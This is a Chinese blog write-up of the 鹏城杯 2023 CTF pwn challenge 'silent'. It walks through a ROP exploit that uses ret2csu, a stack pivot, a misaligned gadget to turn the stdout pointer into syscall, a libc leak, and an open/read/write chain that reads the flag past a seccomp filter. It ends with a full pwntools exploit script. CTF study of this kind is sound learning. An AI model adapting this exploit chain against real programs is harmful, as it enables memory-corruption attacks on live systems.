# 鹏城杯2023WriteUp-Pwn


这个鹏城杯才是我真正意义上的第一场CTF。虽然之前有过校赛，但是校赛上简单题非常多，还是可以混混分的。这场应该算是像样的CTF（甚至还有点恶心），直接给我虐昏了。只能赛后补补题了。

而且比赛当天感冒了，当然这不是关键问题。我学的内容还是比较少的，先把能补的补了，持续更新。

<!--more-->

## silent

唯一有希望做出来的题，看完题解后发现是唯一没希望做出来的题。

首先谈谈思路：由于开启了seccomp禁掉了execve，所以one_gadget直接被毙掉。反编译发现程序只有输入（read函数），没有输出，system更是无从谈起。但是输出是必须的。没有输出就没有地址，没有地址就拿不到libc，没有libc什么函数都用不了（这题显然应该是orw拿flag）。于是这里我们要谈一个叫magic gadget的东西。

我们可以在程序中发现一个叫stdout的东西，具体来说叫：`stdout@@GLIBC_2_2_5`。实际上它存在于libc中，是libc中的一个symbol。我们知道在进程中libc函数的相对位置是固定的，那么我们就可以通过相对的偏移将stdout所在的位置的地址改为其他libc函数，再call stdout的地址即可执行想要的函数。

![image-20231106204727887](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231106204727887.png)

magic gadget就是通过寄存器做到任意修改内存地址的gadgets，它在ida中是找不到的，因为是通过错位的字节码来获得的。使用ROPgadget工具可以找到它的地址：

```bash
ROPgadget --binary silent | grep ret | grep '\[rbp'
# 0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
```

即：`add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret`这三条指令。我们仅需关注第一条指令：它会将rbp - 0x3d所代表的内存处的数值增加ebx。`rbp`和`ebx`是很容易控制的，因此可以实现任意内存地址的读写。

根据大佬们的博客，掌握了上面的内容，下面的内容基本属于固定套路。为了泄露libc基地址，我们需要输出已知函数（read）的实际地址（GOT地址）。我们只需要将stdout偏移至syscall，然后控制rax为1，即可完成`write`的功能。

如何控制rax为1？我们知道，当执行成功的时候，`write`和`read`的返回值分别是成功输出和读入的字节数，而返回值就存放在rax寄存器中。于是我们只需要read1个字节的数据到任意的地点即可完成对rax寄存器的控制。

总结下，如果遇到可用函数很少的情况：

+ 找到存在于libc中的一个函数（通常是stdout），使用magic gadget偏移到syscall上。
+ 使用read函数控制rax为1，然后执行syscall泄露libc地址。

那么再讨论实现的细节。由于溢出空间比较小（实际上是ret2csu所需要空间比较大），首先要做的是将之后的payload读取到bss区然后将栈迁移过去。这个非常简单，具体实现如下所示：

```python
payload1 = flat([
    b'a' * 0x48,	# 填充至retn address
    csu1,
    0, 1, read_got, 0, base_stage, 0x200,	# 将payload读取到base_stage,地址可以任意选择
    csu2,
    0, 0, base_stage - 0x8, 0, 0, 0, 0, leave_ret	# 栈迁移到base_stage，这里减一个0x8是为了让rsp在leave后刚好在base_stage
])
r.send(payload1)
```

csu的两段代码如下，可以在IDA中轻松的找到：

```python
csu1 = 0x40095A
'''
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
'''
csu2 = 0x400940
'''
mov     rdx, r15
mov     rsi, r14
mov     edi, r13d
call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]
add     rbx, 1
cmp     rbp, rbx
jnz     short loc_400940
'''
```

接下来我们就使用magic gadget将stdout偏移为syscall。这里有个细节，为了加上一个负数，这里需要将负数写成补码，方法如下：

```python
offset = (libc.sym['syscall'] + 27 - libc.sym['_IO_2_1_stdout_']) & 0xffffffffffffffff
```

为什么要加27呢？因为这个syscall执行前会有很多额外操作，实测会影响下面进程，于是这里直接偏移到`call syscall`这一条指令上来最为方便。另外，stdout在libc中的名称是`_IO_2_1_stdout_`!!!而且也有名叫stdout的symbol，千万不要弄混。这两者的区别尚不明确。

接下来，我们使用read读取一个字节来控制rax，结束后将下一段payload读取到另外一个位置，再次栈迁移。这是因为我们要在当前的payload末尾放入一个`/flag`字符串为接下来orw做准备。如果接着这个栈的位置使用会有连续性上的问题。这里我比较懒，直接再开一个空间放下一个栈好了。

```python
payload2 = flat([
    csu1,
    offset, stdout + 0x3d, 0, 0, 0, 0,	# stdout移动offset
    magic,
    csu1,
    0, 1, read_got, 0, elf.bss(0x800), 0x1,	# 修改rax
    csu2,
    0, 0, 1, stdout, 0x1, read_got, 0x8,	# 执行syscall -> write
    csu2,
    0, 0, 1, read_got, 0, base_stage + 0x400, 0x200,	# 将下一个payload读到base_stage + 0x400
    csu2, 
    0, 0, base_stage + 0x400 - 0x8, 0, 0, 0, 0, leave_ret,	# 迁移
    b'/flag\x00\x00\x00' # 字符串的位置在base_stage + 40 * 8
])
r.send(payload2)
r.send(b'\x00')	# 别忘了随便发
```

然后就是泄露地址，然后计算orw三个函数的真实地址：

```python
libc_base = u64(r.recvuntil(b'\x7f').ljust(8,b'\x00')) - libc.sym['read']
# info(hex(libc_base))

open_addr = libc.sym['open'] + libc_base
write_addr = libc.sym['write'] + libc_base
read_addr = libc.sym['read'] + libc_base
```

最后就是orw的基本过程，这里`pop rsi`和`pop rdx`的gadgets在程序中找不到，只能去libc中找了。这里为什么不用ret2csu呢？因为用ret2csu中的call执行open函数会直接死掉，这里原因尚不明确，等知道了再来补。

```python
rdi = 0x400963
rsi = libc_base + 0x2601f
rdx = libc_base + 0x142c92

payload3 = flat([
    rdi, base_stage + 40 * 8,
    rsi, 0,
    open_addr,
    rdi, 3,
    rsi, elf.bss(),	# 地址随便填
    rdx, 0x40,
    read_addr,
    rdi, 1,
    write_addr,
    0
])
r.send(payload3)
r.interactive()
```

因为是复盘所以这里没有用题目给的libc，也不想再patch了。但是和实际情况基本没差，只要将exp中的libc加载成题目给的即可。

实际运行结果：

![image-20231106214615034](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231106214615034.png)

flag文件是自己创建在根目录下的。下面给出完整的exp：

```python
from pwn import*
context(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','splitw','-h']

elf = ELF('./silent')
libc = elf.libc
r = elf.process()

offset = (libc.sym['syscall'] + 27 - libc.sym['_IO_2_1_stdout_']) & 0xffffffffffffffff
info(hex(offset))
stdout = 0x601020
read_got = elf.got['read']
base_stage = elf.bss(0x80)
leave_ret = 0x400876
csu1 = 0x40095A
'''
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
'''
csu2 = 0x400940
'''
mov     rdx, r15
mov     rsi, r14
mov     edi, r13d
call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]
add     rbx, 1
cmp     rbp, rbx
jnz     short loc_400940
'''
payload1 = flat([
    b'a' * 0x48,
    csu1,
    0, 1, read_got, 0, base_stage, 0x200,
    csu2,
    0, 0, base_stage - 0x8, 0, 0, 0, 0, leave_ret
])

r.send(payload1)

magic = 0x4007e8
# add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret

payload2 = flat([
    csu1,
    offset, stdout + 0x3d, 0, 0, 0, 0,
    magic,
    csu1,
    0, 1, read_got, 0, elf.bss(0x800), 0x1,
    csu2,
    0, 0, 1, stdout, 0x1, read_got, 0x8,
    csu2,
    0, 0, 1, read_got, 0, base_stage + 0x400, 0x200,
    csu2, 
    0, 0, base_stage + 0x400 - 0x8, 0, 0, 0, 0, leave_ret,
    b'/flag\x00\x00\x00' # base_stage + 39 * 8
])

r.send(payload2)
r.send(b'\x00')

libc_base = u64(r.recvuntil(b'\x7f').ljust(8,b'\x00')) - libc.sym['read']
# info(hex(libc_base))

open_addr = libc.sym['open'] + libc_base
write_addr = libc.sym['write'] + libc_base
read_addr = libc.sym['read'] + libc_base

rdi = 0x400963
rsi = libc_base + 0x2601f
rdx = libc_base + 0x142c92

payload3 = flat([
    rdi, base_stage + 40 * 8,
    rsi, 0,
    open_addr,
    rdi, 3,
    rsi, elf.bss(),
    rdx, 0x40,
    read_addr,
    rdi, 1,
    write_addr,
    0
])

r.send(payload3)
r.interactive()
```

不枉我补了1天，确实是好题。


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/11/pcb2023/  

